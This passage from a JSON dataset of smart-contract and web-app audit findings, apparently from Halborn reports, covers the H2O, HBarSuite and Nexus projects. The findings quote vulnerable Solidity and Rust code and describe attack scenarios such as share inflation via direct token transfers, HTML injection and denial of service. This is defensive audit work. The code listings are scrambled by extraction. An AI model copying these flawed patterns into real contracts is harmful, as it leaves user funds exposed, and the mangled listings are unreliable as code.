risk of this issue, claiming that for the above issue, in case the delay is set incorrectly, you can use the same function call to set it to a correct value. Additionally, the team can add an extra layer by including a multisig system. 45 ",
        "labels": [
            "Halborn",
            "OceanProtocol_Priority_H2O_System_Action",
            "Severity: Low"
        ]
    },
    {
        "title": "AUTHORIZE ACCOUNT CAN INCREASE MAX REWARD DELAY TO MAX INT VALUE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the scope contract FSMWrapper.sol, OSM.sol and DSM.sol, it is observed that the authorize accounts can set max reward increase delay to a vast number, as val is a type of uint256 a max value 2^256-1 could be supplied as an argument which ends up setting the state variable maxRewardIncreaseDelay to max INT value, this sets max reward not to increase for years. Code Location:  Authorize accounts calling modifyParameters with byte32 value of maxRewardIncreaseDelay as a parameter and val as 2^256-1 sets maxRewardIncreaseDelay to max INT value. Listing 36: FSMWrapper.sol, OSM.sol and DSM.sol (Lines 14-17) function modifyParameters ( bytes32 parameter , uint256 val ) 1  external isAuthorized { 2 3  invalid - base - caller - reward \"); 4 5 6 7  invalid - max - caller - reward \" ); 8 9 10 11  increase \" ); 12 13 } if ( parameter == \" baseUpdateCallerReward \" ) { require ( val <= maxUpdateCallerReward , \" FSMWrapper / baseUpdateCallerReward = val ; } else if ( parameter == \" maxUpdateCallerReward \" ) { require ( val >= baseUpdateCallerReward , \" FSMWrapper / maxUpdateCallerReward = val ; } else if ( parameter == \" perSecondCallerRewardIncrease \") { require ( val >= RAY , \" FSMWrapper / invalid - caller - reward - perSecondCallerRewardIncrease = val ; 46 14 15  ); 16 17 18 19 20 21 22 23 24 25 26 else if ( parameter == \" maxRewardIncreaseDelay \" ) { require ( val > 0, \" FSMWrapper / invalid - max - increase - delay \" maxRewardIncreaseDelay = val ; } else if ( parameter == \" reimburseDelay \" ) { reimburseDelay = val ; } else revert ( \" FSMWrapper / modify - unrecognized - param \"); emit ModifyParameters ( parameter , val ); } Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to set a maximum value of maxRewardIncreaseDelay and add a require check that validates val is always less than or equal to max value of maxRewardIncreaseDelay such as require( 0 < val <= maxDelayLimit , \"FSMWrapper/invalid-max-increase-delay\");. Remediation Plan: RISK ACCEPTED: The H2O team accepts the risk of this issue, claiming that for the above issue, in case the delay is set incorrectly, you can use the same function call to set it to a correct value. Additionally, the team can add an extra layer by including a multisig system. 47 ",
        "labels": [
            "Halborn",
            "OceanProtocol_Priority_H2O_System_Action",
            "Severity: Low"
        ]
    },
    {
        "title": "THE CONTRACT FUNCTION SHOULD APPROVE(0",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Some tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value. They must first be approved by zero, and then the actual allowance must be approved. Listing 37 1 IERC20 ( token ). approve ( address ( operator ) , 0) ; 2 IERC20 ( token ). approve ( address ( operator ) , amount ); Code Location: Listing 38: GebProxyIncentivesActions.sol (Line 81) return IUniswapV2Router02 ( uniswapRouter ). DSTokenLike ( getWethPair ( uniswapRouter , systemCoin )) . function _removeLiquidityUniswap ( address uniswapRouter , 80  address systemCoin , uint value , address to , uint [2] memory  minTokenAmounts ) internal returns ( uint amountA , uint amountB ) { 81  approve ( uniswapRouter , value ); 82  removeLiquidityETH ( 83 84 85 86 87 88 89 90 systemCoin , value , minTokenAmounts [0] , minTokenAmounts [1] , to , block . timestamp ); } Listing 39: GebProxyIncentivesActions.sol (Line 70) function _stakeInMine ( address incentives ) internal { DSTokenLike lpToken = DSTokenLike ( GebIncentivesLike ( 68 69  incentives ). stakingToken () ); 48 lpToken . approve ( incentives , uint (0 - 1) ); GebIncentivesLike ( incentives ). stake ( lpToken . balanceOf ( 70 71  address ( this ))); 72 } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Approve with a zero amount first before setting the actual amount. Remediation Plan: RISK ACCEPTED: The H2O team accepts the risk of this issue, claiming that the issue will not be triggered as Uniswap LP tokens will be used in production. Moreover, the team will add documentation to warn downstream users using the H2O system only with tokens that do not exhibit this behavior in their approve functions. 49 ",
        "labels": [
            "Halborn",
            "OceanProtocol_Priority_H2O_System_Action",
            "Severity: Low"
        ]
    },
    {
        "title": "ERC20 APPROVE METHOD MISSING RETURN VALUE CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The following contract functions perform an ERC20.approve() call, but does not check the success return value. Some tokens do not revert if the approval failed and return false instead of true. Code Location: Listing 40: GebProxyActions.sol (Line 192) 187 function increaseBidSize ( address auctionHouse , uint auctionId ,  uint bidSize ) public { 188 SurplusAuctionHouseLike surplusAuctionHouse =  SurplusAuctionHouseLike ( auctionHouse ); 189 DSTokenLike protocolToken = DSTokenLike (  surplusAuctionHouse . protocolToken () ); 190 191 require ( protocolToken . transferFrom ( msg . sender , address (  this ) , bidSize ) , \" geb - proxy - auction - actions / transfer - from - failed \" )  ; 192 protocolToken . approve ( address ( surplusAuctionHouse ) ,  bidSize ); 193 194 // Restarts auction if inactive (, uint amountToSell ,, uint48 bidExpiry , uint48  auctionDeadline ) = surplusAuctionHouse . bids ( auctionId ); 195 if ( auctionDeadline < now && bidExpiry == 0 &&  auctionDeadline > 0) { 196 197 198 199 surplusAuctionHouse . restartAuction ( auctionId ); } // Bid surplusAuctionHouse . increaseBidSize ( auctionId ,  amountToSell , bidSize ); 200 } 50 Listing 41: GebProxyActions.sol (Line 177) 169 function startAndIncreaseBidSize ( address  accountingEngineAddress , uint bidSize ) public { AccountingEngineLike accountingEngine = 170  AccountingEngineLike ( accountingEngineAddress ); 171 SurplusAuctionHouseLike surplusAuctionHouse =  SurplusAuctionHouseLike ( accountingEngine . surplusAuctionHouse () ); 172 DSTokenLike protocolToken = DSTokenLike (  surplusAuctionHouse . protocolToken () ); 173 174 175 176 // Starts auction uint auctionId = accountingEngine . auctionSurplus () ; require ( protocolToken . transferFrom ( msg . sender , address (  this ) , bidSize ) , \" geb - proxy - auction - actions / transfer - from - failed \" )  ; 177 protocolToken . approve ( address ( surplusAuctionHouse ) ,  bidSize ); 178 (, uint amountToSell , , ,) = surplusAuctionHouse . bids (  auctionId ); 179 180 // Bids surplusAuctionHouse . increaseBidSize ( auctionId ,  amountToSell , bidSize ); 181 } Listing 42: GebProxyIncentivesActions.sol (Line 55) CoinJoinLike ( coinJoin ). systemCoin () . approve ( uniswapRouter , IUniswapV2Router02 ( uniswapRouter ). addLiquidityETH { value : function _provideLiquidityUniswap ( address coinJoin , address 54  uniswapRouter , uint tokenWad , uint ethWad , address to , uint [2]  memory minTokenAmounts ) internal { 55  tokenWad ); 56  ethWad }( 57 58 59 60 61 62 63 64 address ( CoinJoinLike ( coinJoin ). systemCoin () ) , tokenWad , minTokenAmounts [0] , minTokenAmounts [1] , to , block . timestamp ); } 51 Listing 43: GebProxyIncentivesActions.sol (Line 81) return IUniswapV2Router02 ( uniswapRouter ). DSTokenLike ( getWethPair ( uniswapRouter , systemCoin )) . function _removeLiquidityUniswap ( address uniswapRouter , 80  address systemCoin , uint value , address to , uint [2] memory  minTokenAmounts ) internal returns ( uint amountA , uint amountB ) { 81  approve ( uniswapRouter , value ); 82  removeLiquidityETH ( 83 84 85 86 87 88 89 90 systemCoin , value , minTokenAmounts [0] , minTokenAmounts [1] , to , block . timestamp ); } Listing 44: GebProxyIncentivesActions.sol (Line 70) function _stakeInMine ( address incentives ) internal { DSTokenLike lpToken = DSTokenLike ( GebIncentivesLike ( lpToken . approve ( incentives , uint (0 - 1) ); GebIncentivesLike ( incentives ). stake ( lpToken . balanceOf ( 68 69  incentives ). stakingToken () ); 70 71  address ( this ))); 72 } Listing 45: CollateralLike Abstract Interface (Lines 23-25) 22 abstract contract CollateralLike { 23 24 25 26 } function approve ( address , uint ) virtual public ; function transfer ( address , uint ) virtual public ; function transferFrom ( address , address , uint ) virtual public ; Listing 46: DSTokenLike Abstract Interface (Line 73) function balanceOf ( address ) virtual public view returns ( uint ) 71 abstract contract DSTokenLike { 72  ; 73 function approve ( address , uint ) virtual public ; 52 function transfer ( address , uint ) virtual public returns ( bool ) function transferFrom ( address , address , uint ) virtual public 74  ; 75  returns ( bool ); 76 } Listing 47: WethLike Abstract Interface (Lines 80-82) function balanceOf ( address ) virtual public view returns ( uint ) 78 abstract contract WethLike { 79  ; 80 81 82 83 84 85 } function approve ( address , uint ) virtual public ; function transfer ( address , uint ) virtual public ; function transferFrom ( address , address , uint ) virtual public ; function deposit () virtual public payable ; function withdraw ( uint ) virtual public ; Risk Level: Likelihood - 1 Impact - 3 Recommendation: Its recommend to using OpenZeppelins SafeERC20 versions with the safeIncreaseAllowance & safeDecreaseAllowance function that handles the return value check as well as non-standard-compliant tokens. Reference: OpenZeppelin SafeERC20 Remediation Plan: RISK ACCEPTED: The H2O team accepts the risk of this issue, claiming that all tokens to be used in production will be reverted in the event of a 53 failure. Moreover, the team will add documentation to warn downstream users to use the H2O system only with tokens that will revert the ERC20. approve(). 54 3.10 (HAL-10) MISSING SAFE ENGINE ADDRESS VALIDATION - LOW ",
        "labels": [
            "Halborn",
            "OceanProtocol_Priority_H2O_System_Action",
            "Severity: Informational"
        ]
    },
    {
        "title": "DENIAL OF SERVICE AFFECTING SMART NODES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest_Report_Halborn_Final.pdf",
        "body": "A Denial-of-Service (DoS) attack is an attack meant to affect an applica- tion, making it inaccessible. DoS attacks accomplish this by overloading the target with traffic, or sending it information that could derive in high resources consumption. The Smart Nodes were affecting by this issue when an attacker using a single machine could overflow their resources. Evidences: Figure 1: Application error when visiting the resource. 12 Figure 2: Multiple errors on the application Risk Level: Likelihood - 5 Impact - 5 Recommendation: Configure a WAF or a denial of service protection in order to adjust the number of requests that a user could send to the applications. Remediation Plan: SOLVED: The issue was solved by the HBarSuite team and verified by Halborn. During the retesting phase, it was possible to denial of service the previously affected items. 13 ",
        "labels": [
            "Halborn",
            "HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest",
            "Severity: Critical"
        ]
    },
    {
        "title": "LACK OF NFT CREATION WHEN ADDING LIQUIDITY TO A POOL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest_Report_Halborn_Final.pdf",
        "body": "One of the functionalities of HBarSuite DEX is the liquidity addition to a pool. This functionality allows a user to add liquidity in to a pool, minting an NFT that is sent to the users wallet, and it is burned when the user claims back the liquidity provided. It was found during the audit that the functionality, stopped working during the last days of the audit. The application was depositing the clients liquidity in to the pool, but no NFTs were minted. This situation made impossible to a user to claim back the liquidity or observe the liquidity added in to the different pools. Note: The HBarSuite team confirmed that the functionality stopped working regarding changes in the 3rd party provider. Code Location: Risk Level: Likelihood - 5 Impact - 5 Recommendation: Modify the application accordingly to the changes of the 3rd party provider. Additionally, add a functionality that could allow a user to mint the NFT after adding liquidity to the pool, in case that something fails, the user could mint the liquidity NFT afterwards. 14 Remediation Plan: SOLVED: The issue was solved by the HBarSuite team and verified by Halborn. During the retesting phase, it was possible to observe that the application was minting the corresponding NFT linked to the liquidity added. Figure 3: NFT created after adding liquidity to a pool. 15 ",
        "labels": [
            "Halborn",
            "HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest",
            "Severity: Critical"
        ]
    },
    {
        "title": "HTML INJECTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest_Report_Halborn_Final.pdf",
        "body": "HyperText Markup Language (HTML) injection is a technique used to take advantage of non-validated input to modify the legitimate behavior of When the application fails to validate the input the application. data, it allows an attacker to perform malicious inputs that could be presented to other users. The range of attacks could vary from simple visual modifications to redirects to malicious web applications where the attacker could perform further attacks. In this case, the web application presented an HTML injection on DAO creation. This could allow an attacker to inject malicious HTML tags and modify the appearance of the application. However, during the assessment not all the available HTML tags were interpreted by the application, reducing the attack surface. 16 Evidence: Risk Level: Likelihood - 3 Impact - 3 Recommendation: Figure 4: HTML injection on DAO creation Filter any kind of malicious character sent to the server. Additionally, limit the types of characters that a user could inject into the application or escape, everything outside of alphanumeric characters. 17 Remediation Plan: SOLVED: The issue was solved by the HBarSuite team and verified by Halborn. It was possible to observe that the application was verifying the malicious input data and sanitizing it before executing any action. 18 ",
        "labels": [
            "Halborn",
            "HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNDEFINED VALUE ON MALICIOUS POOL CREATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest_Report_Halborn_Final.pdf",
        "body": "When a user tries to make a swap between two tokens that do not exist on the DEX, the application was offering to the user to create a pool between both currencies. However, when the requests to create a new pool were tampered and modified to create a malicious pool under the attackers control, the application was detecting this as undefined. This could mean that the application did not have a control to catch an exception when a pool was manipulated and rejected by the application. However, no subsequent issues were found regarding this issue. Evidences: Figure 5: Legitimate request to create a new pool Figure 6: Malicious request to create a pool under attackers control Figure 7: Undefined value detected on the backend 19 Figure 8: Error on the application Risk Level: Likelihood - 2 Impact - 2 Recommendation: Improve the error logging into the application, implementing correct error messages when the backend sanitizes the data or undefined values. Remediation Plan: SOLVED: The issue was solved by the HBarSuite team and verified by Halborn. During the retesting phase, it was possible to observe that the application was verifying the legitimate creation of a pool. 20 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest",
            "Severity: Low"
        ]
    },
    {
        "title": "MISCALCULATION OF BALANCE LEADS TO OVERRATED REWARDS DISTRIBUTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf",
        "body": "split_profit_to_handle_interest The s/basset_vault/src/utils.rs total_stable_coin_balance, which produces the following consequences: function miscalculates contract- of from the always value  The aforementioned function wrongly calculates rewards and overrates them, at expenses of vault funds.  Decisions regarding rewards distribution will be wrongly made: BuyPsi, DepositToAnc or Split.  Total balance could not reach aim_stable_balance, whereby the vault would not be able to repay loans to Anchor. It is important to note that is not possible to revert, undo or correct the logic of the split_profit_to_handle_interest function, unless the vault contract is redeployed, which could lead to a significant loss of users and Nexus vaults funds. Attack scenario: 1. Total stablecoin balance always is miscalculated and wrongly con- siders selling_anc_profit in the calculus, see image below. 16 2. The split_profit_to_handle_interest function overrates rewards val- ues and, when they are distributed, the remaining total balance could not reach aim_stable_balance as it should, see image below. Code Location: Listing 1: contracts/basset_vault/src/utils.rs (Lines 434) 422 pub fn split_profit_to_handle_interest ( 423 424 425 426 427 428 429 ) -> ActionWithProfit { 430 borrowed_amount : Uint256 , aterra_amount : Uint256 , aterra_exchange_rate : Decimal256 , stable_coin_balance : Uint256 , stable_coin_balance_before_sell_anc : Uint256 , over_loan_balance_value : Decimal256 , if stable_coin_balance <= stable_coin_balance_before_sell_anc 431 432 433 434 435 436 437 { return ActionWithProfit :: Nothing ; } let total_stable_coin_balance = aterra_amount * aterra_exchange_rate + stable_coin_balance ; let selling_anc_profit = stable_coin_balance - stable_coin_balance_before_sell_anc ; let aim_stable_balance = borrowed_amount * over_loan_balance_value ; Risk Level: Likelihood - 5 Impact - 4 17 Recommendation: Update the total_stable_coin_balance formula not to include the value of selling_anc_profit. Below is a proposed sample formula: total_stable_coin_balance stable_coin_balance_bef ore_sell_anc = aterra_amount  aterra_exchange_rate + Remediation plan: SOLVED: Issue fixed in commit cbaeb5bd108c030d5993145d080495c1ccf1719f. 18 ",
        "labels": [
            "Halborn",
            "Nexus_Protocol_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "MISCALCULATION OF NASSET TOKENS TO MINT LEADS TO UNFAIR WITHDRAWING / DOS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf",
        "body": "The deposit_basset function from contracts/basset_vault/src/commands.rs miscalculates the value of nasset_to_mint if someone has previously trans- ferred bAsset tokens directly to the vault, which produces the following consequences:  When a legitimate user deposits bAsset tokens to the vault, the nasset_to_mint value will be lower than it should be, which leads to unfair withdrawing.  If nAsset supply is zero, legitimate users will not be able to deposit or withdraw bAssets anymore, which causes an unrecoverable denial of service (DoS) of the Nexus protocol. It is important to note that it is not possible to revert, undo or correct the logic of the deposit_basset function, unless the vault contract is redeployed, which could lead to a significant loss of users or Nexus vaults funds. Attack scenario: 1. User #1 uses the deposit_basset function to deposit 2000 bLuna tokens into the vault and receives 2000 nAsset tokens in return. 2. Someone transfers 2000 bLuna tokens directly to the vault. 3. User #2 uses the deposit_basset function to deposit 2000 bLuna tokens in the vault and receives 1000 nAsset tokens in return, instead of 2000 like User #1. 4. User #2 uses the withdraw_basset function to withdraw all its bLuna, but receives 1333 bLuna tokens, instead of 2000 he had deposited. 19 Code Location: Listing 2: contracts/basset_vault/src/commands.rs (Lines 169,178) 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 let basset_in_contract_address = query_token_balance ( deps . as_ref () , & config . basset_token , & env . contract . address ) ?; let basset_balance : Uint256 = basset_in_custody + basset_in_contract_address . into () ; if basset_balance == Uint256 :: zero () { // impossible because ' farmer ' already sent some basset return Err ( StdError :: generic_err ( \" basset balance is zero ( impossible case ) \". to_string () , )); } let farmer_basset_share : Decimal256 = Decimal256 :: from_ratio ( deposit_amount .0 , basset_balance .0) ; // nAsset tokens to mint : // user_share = ( deposited_basset / total_basset ) // nAsset_to_mint = nAsset_supply * user_share / (1 - user_share ) let nasset_to_mint = if farmer_basset_share == Decimal256 :: one () { deposit_amount } else { // ' nasset_supply ' can ' t be zero here , cause we already mint some for first farmer nasset_supply * farmer_basset_share / ( Decimal256 :: one () - farmer_basset_share ) 179 }; Risk Level: Likelihood - 4 Impact - 4 Recommendation: Update deposit_amount value to include bAsset tokens directly transferred to the vault. Below are proposed sample formulas: 20 deposit_amount = basset_in_contract_address nasset_to_mint = nasset_supply  deposit_amount basset_balance  deposit_amount Remediation plan: SOLVED: Issue fixed in commit dd6c2467c5e1f7bdc90c7b87b3c7fb4ee8c6244d. 21 ",
        "labels": [
            "Halborn",
            "Nexus_Protocol_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "NO UPDATE OF LOAN REPAYMENT STATE ON REBALANCE FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf",
        "body": "The rebalance function from contracts/basset_vault/src/commands.rs never resets repaying_loan_state value when loan repayment completes, so its iteration_index will continue increasing until reaching the maximum number of iterations allowed. Once it happens, loan repayments could be wrongly marked as completed or throw error messages, instead of iterating to actually complete the repayment. It is important to note that is not possible to revert, undo or correct the logic of the rebalance function, unless the vault contract is redeployed, which could lead to a significant loss of users or Nexus vaults funds. Code Location: Listing 3: contracts/basset_vault/src/commands.rs (Lines 389) 384 385 386 387 388 389 390 391 392 393 BorrowerActionResponse :: Repay { amount , advised_buffer_size , } => { store_aim_buffer_size ( deps . storage , & advised_buffer_size ) ?; let mut repaying_loan_state = load_repaying_loan_state ( deps . as_ref () . storage ) ?; repaying_loan_state . to_repay_amount = amount ; repaying_loan_state . aim_buffer_size = advised_buffer_size ; repay_logic ( deps , env , config , repaying_loan_state ) } 22 Risk Level: Likelihood - 5 Impact - 3 Recommendation: Update the logic of rebalance function to reset repaying_loan_state value when loan repayment completes. Remediation plan: SOLVED: Issue fixed in commit c5714f1d8d73dac552820a3180cd598b33bb2bcb. 23 ",
        "labels": [
            "Halborn",
            "Nexus_Protocol_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "PRIVILEGED ADDRESSES CAN BE TRANSFERRED WITHOUT CONFIRMATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf",
        "body": "An incorrect use of the update_config function in contracts can set owner to an invalid address and inadvertently lose control of the contracts, which cannot be undone in any way. Currently, the owner of the contracts can change governance contract address (owner) using the aforementioned function in a single transaction and without confirmation from the new address. The affected smart contracts are the following:  basset_vault  basset_vault_strategy  nasset_token_config_holder  nasset_token_rewards  psi_distributor Code Location: Listing 4: contracts/basset_vault/src/commands.rs 52 53 if let Some ( ref gov_addr ) = gov_addr { current_config . governance_contract = deps . api . addr_validate ( gov_addr ) ?; 54 } Listing 5: contracts/basset_vault_strategy/src/commands.rs 24 25 if let Some ( ref governance_addr ) = governance_addr { current_config . governance_contract = deps . api . addr_validate ( governance_addr ) ?; 26 } 24 Listing 6: contracts/nasset_token_config_holder/src/contract.rs 88 89 if let Some ( ref governance_addr ) = governance_contract_addr { current_config . governance_contract = deps . api . addr_validate ( governance_addr ) ?; 90 } Listing 7: contracts/nasset_token_rewards/src/commands.rs 32 33 if let Some ( ref governance_contract ) = governance_contract { current_config . governance_contract = deps . api . addr_validate ( governance_contract ) ?; 34 } Listing 8: contracts/psi_distributor/src/commands.rs 142 if let Some ( ref governance_contract_addr ) = governance_contract_addr { current_config . governance_contract = deps . api . addr_validate ( governance_contract_addr ) ?; 143 144 } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to split ownership transfer functionality into set_owner and accept_ownership functions. The latter function allows the transfer to be completed by recipient. Remediation plan: SOLVED: Issue fixed in the following commits:  561ab303f514ea9b3d68940cbe4f864ccc7cce12 25  14e76524135074757aae4e635dc2c352d3c611ca  9523bf781294e8134aeb8bbdb152ea9ba90eeb49  cf9709ba279507ae2951039fed8368f504184291  b551a6cd48864af1874356a05cf5984aa6bc4e22 26 ",
        "labels": [
            "Halborn",
            "Nexus_Protocol_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "DECIMAL RATES COULD BE UPDATED TO A VALUE GREATER OR EQUAL THAN 1",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf",
        "body": "update_config The contracts/psi_distributor/src/com- mands.rs changes all fields directly, so does not restrict that values of manual_ltv, fee_rate or tax_rate are greater or equal than 1. function from The aforementioned values are used to calculate reward distribution and if are not correctly set, the formula will always panic and wont allow legitimate users to claim their rewards, thus generating a denial of service (DoS) in Nexus protocol. Code Location: Listing 9: contracts/psi_distributor/src/commands.rs 162 163 164 165 166 167 168 169 170 171 172 if let Some ( manual_ltv ) = manual_ltv { current_config . manual_ltv = manual_ltv ; } if let Some ( fee_rate ) = fee_rate { current_config . fee_rate = fee_rate ; } if let Some ( tax_rate ) = tax_rate { current_config . tax_rate = tax_rate ; } Risk Level: Likelihood - 2 Impact - 3 27 Recommendation: Add a validation routine inside update_config function to ensure that values of manual_ltv, fee_rate and tax_rate are lesser than 1. Remediation plan: SOLVED: Issue fixed in commit 36c2395e68ee805426dccf46d6cb1e98f2bd3834. 28 ",
        "labels": [
            "Halborn",
            "Nexus_Protocol_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "LOAN REPAYMENT COULD TAKE MORE ITERATIONS THAN ALLOWED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf",
        "body": "The set_buffer_part function from contracts/basset_vault_strategy/src/s- tate.rs changes the value of buffer_part directly and does not verify if this value does not exceed the number of iterations allowed by the LOAN_REPAYMENT_MAX_RECURSION_DEEP constant. If the number of iterations reaches its maximum value, the loan repayment will be wrongly marked as completed (because of previous partial pay- ments), instead of throwing an error message for loan repayment failure. Code Location: Listing 10: contracts/basset_vault_strategy/src/state.rs 70 pub fn set_buffer_part (& mut self , value : Decimal256 ) -> ContractResult <() > { if value . is_zero () || value > Decimal256 :: one () { return Err ( ContractError :: InappropriateValue ); } self . buffer_part = value ; Ok (() ) 71 72 73 74 75 76 77 } Risk Level: Likelihood - 1 Impact - 3 29 Recommendation: Add a validation routine inside set_buffer_part function to ensure that loan repayment will be able to complete within the number of iterations allowed. Below is a proposed sample validation for this routine: buf f er_part >= max_ltv  aim_ltv LOAN_REP AY M EN T_M AX_RECU RSION_DEEP Remediation plan: SOLVED: Issue fixed in commit cfe2ef43d778d2b363abd6bd5d287066bfe86aca. 30 ",
        "labels": [
            "Halborn",
            "Nexus_Protocol_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "ROUNDING ISSUES WHEN DEPOSITING / WITHDRAWING BASSET TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf",
        "body": "calculating When and basset_to_withdraw in withdraw_basset function, the multiply before divide principle is not followed, which generates rounding issues. nasset_to_mint deposit_basset function in Although the actual difference for rounding in each operation is very small, in the long run and with enough operations, it could cause a significant imbalance. Code Location: Calculating the nAsset tokens to mint: Listing 11: contracts/basset_vault/src/commands.rs (Lines 169,178) Decimal256 :: from_ratio ( deposit_amount .0 , basset_balance .0) ; 168 let farmer_basset_share : Decimal256 = 169 170 171 // nAsset tokens to mint : 172 // user_share = ( deposited_basset / total_basset ) 173 // nAsset_to_mint = nAsset_supply * user_share / (1 - user_share ) 174 let nasset_to_mint = if farmer_basset_share == Decimal256 :: one () { 175 176 } else { 177 // ' nasset_supply ' can 't be zero here , cause we already mint deposit_amount some for first farmer 178 nasset_supply * farmer_basset_share / ( Decimal256 :: one () - farmer_basset_share ) 179 }; 31 Calculating the bAsset tokens to withdraw: Listing 12: contracts/basset_vault/src/commands.rs (Lines 280,283) 279 let share_to_withdraw : Decimal256 = Decimal256 :: from_ratio ( 280 281 282 ); 283 let basset_to_withdraw : Uint256 = basset_in_custody * nasset_to_withdraw_amount .0 , Uint256 :: from ( nasset_token_supply ) .0 , share_to_withdraw ; Risk Level: Likelihood - 3 Impact - 1 Recommendation: The formulas to calculate nasset_to_mint and basset_to_withdraw should be rewritten to reduce rounding issues. Below are proposed sample formulas: nasset_to_mint = nasset_supply  deposit_amount basset_balance  deposit_amount basset_to_withdraw = basset_in_custody  nasset_to_withdraw_amount nasset_token_supply Remediation plan: SOLVED: Issue fixed in commit d80eef123844c614c9eb43180828ddc7ea8ac49c. 32 ",
        "labels": [
            "Halborn",
            "Nexus_Protocol_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "UNAUTHORIZED TOKEN REWARDS CONTRACT ADDRESS MODIFICATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf",
        "body": "can method be set_nasset_token_rewards_contract The contracts/ update nasset_token_config_holder/src/state.rs the contract configuration and set the nAsset rewards contract address if it hasnt been already set. This config option is world-writeable and can be accessed by sending a SetTokenRewardsContract message to the handler in contracts/nasset_token_config_holder/src/contract.rs. This may lead to unauthorized config modification and possible loss of users rewards. in used to Code Location: Listing 13: (Lines 42,47) contracts/nasset_token_config_holder/src/contract.rs AnyoneMsg :: SetTokenRewardsContract { 37 ExecuteMsg :: Anyone { anyone_msg } = > match anyone_msg { 38 39 40 41 42 let config = load_config ( deps . storage ) ?; if config . nasset_token_rewards_contract . to_string () . nasset_token_rewards_contract_addr , } => { 43 44 45 46 47 48 49 50 51 is_empty () { let addr = deps . api . addr_validate (& nasset_token_rewards_contract_addr ) ?; set_nasset_token_rewards_contract ( deps . storage , addr ) ?; Ok ( Response :: default () ) } else { return Err ( ContractError :: Unauthorized {}) ; 33 52 } Listing 14: 20) contracts/nasset_token_config_holder/src/state.rs (Lines storage : & mut dyn Storage , addr : Addr , 15 pub fn set_nasset_token_rewards_contract ( 16 17 18 ) -> StdResult < Config > { 19 singleton ( storage , KEY_CONFIG ). update (| mut cfg : Config | -> StdResult <_ > { cfg . nasset_token_rewards_contract = addr ; Ok ( cfg ) 20 21 22 23 } }) Risk Level: Likelihood - 1 Impact - 2 Recommendations: All sensitive operations on configuration data should require prior au- thorization in order not to be modified by malicious individuals. Remediation plan:: the Nexus This ACKNOWLEDGED: nasset_config_holder token contract initialization which makes this vulnerability highly unlikely to be exploited. acknowledged initialized this on contract finding. bAsset team the is 34 ",
        "labels": [
            "Halborn",
            "Nexus_Protocol_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "GLOBAL INDEX MANIPULATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf",
